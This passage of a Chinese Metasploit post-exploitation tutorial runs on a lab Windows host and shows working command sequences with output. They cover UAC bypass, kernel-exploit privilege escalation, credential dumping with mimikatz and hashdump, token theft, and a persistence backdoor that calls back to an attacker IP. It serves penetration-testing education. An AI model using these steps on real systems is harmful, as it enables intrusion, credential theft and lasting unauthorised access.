</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">2</span>  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass <span style="color:#ff636f">(</span>Via Eventvwr Registry Key<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">3</span>  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass <span style="color:#ff636f">(</span>Via FodHelper Registry Key<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">4</span>  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass <span style="color:#ff636f">(</span>In Memory Injection<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">5</span>  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass <span style="color:#ff636f">(</span>In Memory Injection<span style="color:#ff636f">)</span> abusing WinSXS
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">6</span>  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass <span style="color:#ff636f">(</span>Via Slui File Handler Hijack<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">7</span>  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass <span style="color:#ff636f">(</span>ScriptHost Vulnerability<span style="color:#ff636f">)</span></span></span></code></pre></div><p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 示例</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: SAUCERMAN<span style="color:#a6be9d">\T</span>ideSec
</span></span><span style="display:flex;"><span>meterpreter &gt; background
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Backgrounding session 4...
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>multi/handler<span style="color:#ff636f">)</span> &gt;  use exploit/windows/local/bypassuac
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/bypassuac<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> SESSION <span style="color:#a6be9d">4</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SESSION</span> <span style="color:#ff636f">=</span>&gt; <span style="color:#a6be9d">4</span>
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/bypassuac<span style="color:#ff636f">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Handler failed to <span style="color:#58a1dd">bind</span> to 192.168.81.160:4444:-  -
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Handler failed to <span style="color:#58a1dd">bind</span> to 0.0.0.0:4444:-  -
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> UAC is Enabled, checking level...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> UAC is <span style="color:#58a1dd">set</span> to Default
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> BypassUAC can bypass this setting, continuing...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Part of Administrators group! Continuing...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Uploaded the agent to the filesystem....
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Uploading the bypass UAC executable to the filesystem...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Meterpreter stager executable <span style="color:#a6be9d">73802</span> bytes long being uploaded..
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Sending stage <span style="color:#ff636f">(</span><span style="color:#a6be9d">206403</span> bytes<span style="color:#ff636f">)</span> to 192.168.81.154
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Meterpreter session <span style="color:#a6be9d">5</span> opened <span style="color:#ff636f">(</span>192.168.81.160:4444 -&gt; 192.168.81.154:1134<span style="color:#ff636f">)</span> at 2019-06-12 06:31:11 -0700
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Exploit failed <span style="color:#ff636f">[</span>timeout-expired<span style="color:#ff636f">]</span>: Timeout::Error execution expired
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Exploit completed, but no session was created.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 然鹅这里失败了</span></span></span></code></pre></div><p>3.内核漏洞提权</p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run post/windows/gather/enum_patches  <span style="color:#828b96;font-style:italic">#查看补丁信息</span>
</span></span><span style="display:flex;"><span>msf5 &gt; use exploit/windows/local/ms13_053_schlamperei
</span></span><span style="display:flex;"><span>msf5 &gt; <span style="color:#58a1dd">set</span> SESSION <span style="color:#a6be9d">2</span>
</span></span><span style="display:flex;"><span>msf5 &gt; exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 示例</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; run post/windows/gather/enum_patches
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2871997 is missing
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2928120 is missing
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB977165 - Possibly vulnerable to MS10-015 kitrap0d <span style="color:#ff636f">if</span> Windows 2K SP4 - Windows <span style="color:#a6be9d">7</span> <span style="color:#ff636f">(</span>x86<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2305420 - Possibly vulnerable to MS10-092 schelevator <span style="color:#ff636f">if</span> Vista, 7, and <span style="color:#a6be9d">2008</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf <span style="color:#ff636f">if</span> XP SP2/SP3 Win 2k3 SP2
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2850851 - Possibly vulnerable to MS13-053 schlamperei <span style="color:#ff636f">if</span> x86 Win7 SP0/SP1
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu <span style="color:#ff636f">if</span> x86 Windows <span style="color:#a6be9d">7</span> SP0/SP1
</span></span><span style="display:flex;"><span>meterpreter &gt; background
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Backgrounding session 4...
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/bypassuac<span style="color:#ff636f">)</span> &gt; search MS13-081
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching <span style="color:#58a1dd">Modules</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#828b96;font-style:italic">#  Name                                             Disclosure Date  Rank     Check  Description</span>
</span></span><span style="display:flex;"><span>   -  ----                                             ---------------  ----     -----  -----------
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">0</span>  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/bypassuac<span style="color:#ff636f">)</span> &gt; use exploit/windows/local/ms13_081_track_popup_menu
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/ms13_081_track_popup_menu<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> session <span style="color:#a6be9d">4</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session</span> <span style="color:#ff636f">=</span>&gt; <span style="color:#a6be9d">4</span>
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/ms13_081_track_popup_menu<span style="color:#ff636f">)</span> &gt; exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> SESSION may not be compatible with this module.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Handler failed to <span style="color:#58a1dd">bind</span> to 192.168.81.160:4444:-  -
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Handler failed to <span style="color:#58a1dd">bind</span> to 0.0.0.0:4444:-  -
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Exploit completed, but no session was created.
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 然鹅失败了，摸摸头</span></span></span></code></pre></div><h3 id="获取凭证httpsbookshentoushitopmanualredteam_commandhtml获取凭证" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e8%8e%b7%e5%8f%96%e5%87%ad%e8%af%81"target="_blank" rel="external nofollow noopener noreferrer">获取凭证</a></span>
  <a href="#%e8%8e%b7%e5%8f%96%e5%87%ad%e8%af%81httpsbookshentoushitopmanualredteam_commandhtml%e8%8e%b7%e5%8f%96%e5%87%ad%e8%af%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p>1.使用mimikatz</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>load mimikatz    <span style="color:#828b96;font-style:italic">#help mimikatz 查看帮助</span>
</span></span><span style="display:flex;"><span>wdigest  <span style="color:#828b96;font-style:italic">#获取Wdigest密码</span>
</span></span><span style="display:flex;"><span>mimikatz_command -f samdump::hashes  <span style="color:#828b96;font-style:italic">#执行mimikatz原始命令</span>
</span></span><span style="display:flex;"><span>mimikatz_command -f sekurlsa::searchPasswords
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 示例</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; load mimikatz
</span></span><span style="display:flex;"><span>Loading extension mimikatz...<span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Loaded Mimikatz on a newer OS <span style="color:#ff636f">(</span>Windows <span style="color:#a6be9d">7</span> <span style="color:#ff636f">(</span>Build 7601, Service Pack 1<span style="color:#ff636f">)</span>.<span style="color:#ff636f">)</span>. Did you mean to <span style="color:#a6be9d">&#39;load kiwi&#39;</span> instead?
</span></span><span style="display:flex;"><span>Success.
</span></span><span style="display:flex;"><span>meterpreter &gt; wdigest
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Not currently running as SYSTEM
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Attempting to getprivs ...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Got SeDebugPrivilege.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Retrieving wdigest credentials
</span></span><span style="display:flex;"><span>wdigest <span style="color:#58a1dd">credentials</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">===================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>AuthID    Package    Domain        User           Password
</span></span><span style="display:flex;"><span>------    -------    ------        ----           --------
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">997</span>     Negotiate  NT AUTHORITY  LOCAL SERVICE  
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">996</span>     Negotiate  WORKGROUP     SAUCERMAN$     
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">48748</span>   NTLM                                    
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">999</span>     NTLM       WORKGROUP     SAUCERMAN$     
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">476238</span>  NTLM       SAUCERMAN     TideSec        <span style="color:#a6be9d">123456</span>
</span></span><span style="display:flex;"><span>0;<span style="color:#a6be9d">476209</span>  NTLM       SAUCERMAN     TideSec        <span style="color:#a6be9d">123456</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; mimikatz_command -f samdump::hashes
</span></span><span style="display:flex;"><span>Ordinateur : saucerman
</span></span><span style="display:flex;"><span>BootKey    : 691cff33caf49e933be97fcee370256a
</span></span><span style="display:flex;"><span>RegOpenKeyEx SAM : <span style="color:#ff636f">(</span>0x00000005<span style="color:#ff636f">)</span> �ݿ� 
</span></span><span style="display:flex;"><span>Erreur lors de l&#39;exploration du registre
</span></span><span style="display:flex;"><span>meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>0<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> TideSec ; SAUCERMAN ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>1<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> TideSec ; SAUCERMAN ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>2<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> SAUCERMAN ; TideSec ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>3<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> SAUCERMAN ; TideSec ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>4<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> TideSec ; SAUCERMAN ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>5<span style="color:#ff636f">]</span> <span style="color:#ff636f">{</span> TideSec ; SAUCERMAN ; <span style="color:#a6be9d">123456</span> <span style="color:#ff636f">}</span></span></span></code></pre></div><ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run hashdump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Example: run post/windows/gather/smart_hashdump <span style="color:#58a1dd">OPTION</span><span style="color:#ff636f">=</span>value <span style="color:#ff636f">[</span>...<span style="color:#ff636f">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Obtaining the boot key...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
</span></span><span style="display:flex;"><span>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Obtaining the user list and keys...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Decrypting user keys...
</span></span><span style="display:flex;"><span>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style="display:flex;"><span>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style="display:flex;"><span>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Dumping password hints...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TideSec:<span style="color:#a6be9d">&#34;123456&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Dumping password hashes...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span></span></code></pre></div><p>3.post/windows/gather/smart_hashdump</p>
<p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run post/windows/gather/smart_hashdump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Running module against SAUCERMAN
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Hashes will be saved to the database <span style="color:#ff636f">if</span> one is connected.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Hashes will be saved in loot in JtR password file format to:
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Dumping password hashes...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Running as SYSTEM extracting hashes from registry
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Obtaining the boot key...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Obtaining the user list and keys...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Decrypting user keys...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Dumping password hints...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span>     TideSec:<span style="color:#a6be9d">&#34;123456&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>     Dumping password hashes...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span>     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span>     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span></span></code></pre></div><p>4.powerdump 同 hashdump，但失败了</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run powerdump
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Running PowerDump to extract Username and Password Hashes...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Uploaded PowerDump as 69921.ps1 to %TEMP%...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Setting ExecutionPolicy to Unrestricted...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Dumping the SAM database through PowerShell...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>-<span style="color:#ff636f">]</span> Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span></span></code></pre></div><h3 id="假冒令牌httpsbookshentoushitopmanualredteam_commandhtml假冒令牌" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%81%87%e5%86%92%e4%bb%a4%e7%89%8c"target="_blank" rel="external nofollow noopener noreferrer">假冒令牌</a></span>
  <a href="#%e5%81%87%e5%86%92%e4%bb%a4%e7%89%8chttpsbookshentoushitopmanualredteam_commandhtml%e5%81%87%e5%86%92%e4%bb%a4%e7%89%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 1.incognito假冒令牌</span>
</span></span><span style="display:flex;"><span>use incognito      <span style="color:#828b96;font-style:italic">#help incognito  查看帮助</span>
</span></span><span style="display:flex;"><span>list_tokens -u    <span style="color:#828b96;font-style:italic">#查看可用的token</span>
</span></span><span style="display:flex;"><span>impersonate_token <span style="color:#a6be9d">&#39;NT AUTHORITY\SYSTEM&#39;</span>  <span style="color:#828b96;font-style:italic">#假冒SYSTEM token</span>
</span></span><span style="display:flex;"><span>或者impersonate_token NT<span style="color:#a6be9d">\ </span>AUTHORITY<span style="color:#a6be9d">\\</span>SYSTEM <span style="color:#828b96;font-style:italic">#不加单引号 需使用\\</span>
</span></span><span style="display:flex;"><span>execute -f cmd.exe -i –t    <span style="color:#828b96;font-style:italic"># -t 使用假冒的token 执行</span>
</span></span><span style="display:flex;"><span>或者直接shell
</span></span><span style="display:flex;"><span>rev2self   <span style="color:#828b96;font-style:italic">#返回原始token</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 2.steal_token窃取令牌</span>
</span></span><span style="display:flex;"><span>steal_token &lt;pid值&gt;   <span style="color:#828b96;font-style:italic">#从指定进程中窃取token   先ps,找域控进程</span>
</span></span><span style="display:flex;"><span>drop_token  <span style="color:#828b96;font-style:italic">#删除窃取的token</span></span></span></code></pre></div><h3 id="植入后门httpsbookshentoushitopmanualredteam_commandhtml植入后门" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%a4%8d%e5%85%a5%e5%90%8e%e9%97%a8"target="_blank" rel="external nofollow noopener noreferrer">植入后门</a></span>
  <a href="#%e6%a4%8d%e5%85%a5%e5%90%8e%e9%97%a8httpsbookshentoushitopmanualredteam_commandhtml%e6%a4%8d%e5%85%a5%e5%90%8e%e9%97%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p>
<p>1.persistence启动项后门</p>
<p>路径：metasploit/scripts/meterpreter/persistence</p>
<p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run persistence –h  <span style="color:#828b96;font-style:italic">#查看帮助</span>
</span></span><span style="display:flex;"><span>run persistence -X -i <span style="color:#a6be9d">5</span> -p <span style="color:#a6be9d">4444</span> -r 192.168.81.160
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span>
